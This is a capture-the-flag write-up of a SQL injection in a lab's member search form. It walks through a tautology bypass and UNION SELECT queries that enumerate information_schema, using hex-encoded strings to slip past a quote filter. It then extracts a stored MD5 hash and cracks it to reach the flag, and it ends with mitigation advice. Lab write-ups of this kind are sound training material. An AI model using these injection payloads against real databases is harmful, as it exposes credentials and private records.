# A1 - SQL Injection (I)

OWASP Top 10 (2017) vulnerability. Found in the member search form (`members`), where user input is injected directly into the SQL query.

---

## Steps to Obtain the Flag

### 1. Confirm the Vulnerability (Tautology Bypass)

Enter in the search field:
```
1 or 1
```
The resulting query returns all table records. Four users are observed; the last has surname `getThe` and first name `flag`, confirming the vulnerability.

---

### 2. Enumerate Database Structure (UNION)

The original query selects **two columns**, so any `UNION SELECT` must respect that number. Additionally, quotes are filtered, so strings are passed in **hexadecimal**.

**List tables:**
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()
```
Relevant Result: `users` table.

**List columns of `users`** (`users` in hex = `0x7573657273`):
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273
```
Columns of interest: `commentaire` and `countersign`.

---

### 3. Extract Data and Obtain the Flag

```sql
1 UNION SELECT commentaire, countersign FROM users
```

Response:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname:    5ff9d0165b4f92b14994e5c685cdce28
```

**Process:**
1. The hash `5ff9d0165b4f92b14994e5c685cdce28` is MD5 → decrypts to `FortyTwo`
2. Convert to lowercase → `fortytwo`
3. Apply SHA-256 → result is the **flag**

> Recommended Tool: [CyberChef](https://gchq.github.io/CyberChef/)

---

## Impact

- **Confidentiality:** access to any database data without credentials.
- **Enumeration:** ability to reconstruct the entire internal database structure.

---

## Mitigation

1. **Prepared Queries (Parametrized):** most effective defense; input is always treated as literal data.
2. **Input Validation:** whitelists to filter disallowed characters.
3. **Principle of Least Privilege:** database user accesses only what's strictly necessary.
